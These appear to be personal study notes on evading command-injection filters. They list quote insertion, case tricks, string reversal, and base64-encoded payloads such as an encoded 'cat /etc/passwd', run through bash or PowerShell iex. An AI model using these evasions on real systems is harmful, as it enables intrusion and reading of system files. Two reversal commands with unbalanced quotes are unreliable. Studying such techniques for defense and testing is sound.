- command obfuscation to change the look of our command to help bypass the filters.
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion
## Basic Command Obfuscation
### Command Blacklist
- `whoami` - blacklisted
- ![](/attachments/Pasted-image-20250809214438.png)
- we try to change the command a little to bypass the exact word check
### Linux & Windows
- add characters that might be ignored by `bash` or `powershell`
	- eg: `'` or `"`
- is `whoami` is blocked
	- `w'h'o'am'i`
- can do the same with `"`
- keep number of quotes even. use the same type of quotes throughout.
### Linux only
- use `\` backslash or `$@` positional parameter character.
### Windows only
- `^` - carrot 

<hr>

## Advanced Command Obfuscation
- to bypass waf and advanced filters
### Case Manipulation
- `wHoAMi`
- Windows is case-insensitive so it will execute the command
- Linux is case-sensitive so we will have to create a command that will then turn our payload into lowercase
	- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
### Reverse Commands
- **Using LINUX**
- to reverse a command:
	- `echo 'whoami | rev`
- execute as original
	- `$(rev<<<'imaohw)`
- **Using WINDOWS**
- reverse a command
	- `"whoami"[-1..-20] -join ''`
- execute as original
	- `iex "$(command)"` - used to execute
	- `iex "$('imaohw'[-1..-20] -join '')"`

### Encoded Commands
- base64 or xxd (hex) encoding
- **LINUX**
- base64 encode a payload
	- `echo -n 'cat /etc/passwd | grep 33' | base64`
- execute as original
	- `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

- if `bash` is blacklisted use `sh`
- if `base64` is blacklisted use `openssl`
- use `xxd`
<br>
- **Windows**
- Convert string to base64
	- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
	- `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` - on linux convert utf-8 to utf-16
- convert base64 string to original and execute
	- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
